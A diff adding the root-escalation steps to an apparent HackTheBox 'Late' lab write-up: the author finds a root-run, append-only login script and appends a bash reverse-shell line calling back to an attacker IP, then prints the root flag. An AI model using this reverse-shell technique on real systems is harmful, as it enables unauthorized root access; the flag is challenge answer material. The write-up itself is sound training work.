@@ -165,6 +165,56 @@ svc_acc@late:~/.ssh$
 ```
 
 16. Finally, simply run --> `ssh -i svc_acc svc_acc@late.htb` and we got the stable shell.
+17. Now let's download the linpeas to the remote server from our local. (do not turn off the http.server 80).
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/2a779ffa-1693-4809-bdc4-66b2223ae6f7)
 
 
+> FOOTHOLD FOR ROOT
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/53858fe7-caa8-4b7b-96bf-1acfae583bec)
+
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/e2509a3a-fba1-4193-8dc9-a117374dfc0b)
+
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/29730eb7-f5f9-407d-9513-67de5d72d295)
+
+
+18. Well we can't overwrite it, but we can "append" line there and we can exeute it. This can be proven by running `lsattr`.
+
+```
+svc_acc@late:~$ lsattr /usr/local/sbin/ssh-alert.sh
+-----a--------e--- /usr/local/sbin/ssh-alert.sh
+```
+  
+19. This means we can append our privesc payload there.
+20. But we need to make sure whether this bash script is being run as root or not. If it's being run as root, hence it allows us to do privesc.
+
+> USING PSPY64 - RESULT --> IT IS BEING RUN AS ROOT **EVERYTIME WE LOGGED IN AND LOGOUT**.
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/ab020ac2-a396-465e-92c2-000c05e53e93)
+
+
+21. Let's append it then, run listener, and exit the session.
+
+```
+echo "bash -i >& /dev/tcp/10.10.16.20/1337 0>&1" >> /usr/local/sbin/ssh-alert.s
+```
+
+> RESULT
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/4cebca10-bc2b-44ae-b0b7-599831913bf0)
+
+
+> GETTING ROOT FLAG
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/0d2a2f8a-e000-4d16-a61b-185316bb9a34)
+
+
+## ROOT FLAG
+
+```
+09040a7f92b2dfb6d3fd5bb5fb6cb088
+```
 
